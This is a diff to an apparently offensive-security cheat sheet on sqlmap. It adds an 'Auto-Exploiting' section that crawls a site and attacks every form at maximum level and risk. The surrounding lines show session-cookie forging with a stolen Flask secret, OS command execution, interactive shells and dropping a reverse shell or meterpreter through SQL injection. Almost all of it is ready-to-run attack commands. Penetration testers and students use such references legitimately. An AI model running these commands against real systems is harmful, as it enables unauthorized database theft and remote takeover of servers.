@@ -133,11 +133,12 @@ sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
 
 
 Sqlmap supports the usage of -e or --eval to process each payload before delivering it with a oneliner in Python. This makes customizing the payload before sending it very simple and quick. In the following example, flask signs the flask cookie session with the known secret before transmitting it:
+
 ```python
 sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
 ```
 
-<b> Implementing Shell Unix in Linux </b>
+<b> Implementing Shell Unix in Linux # </b>
 ```python
 #Exec command
 python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
@@ -147,4 +148,12 @@ python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
 
 #Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
+```
+<b> Auto-Exploiting with SQLMap # </b>
+```python
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
 ```
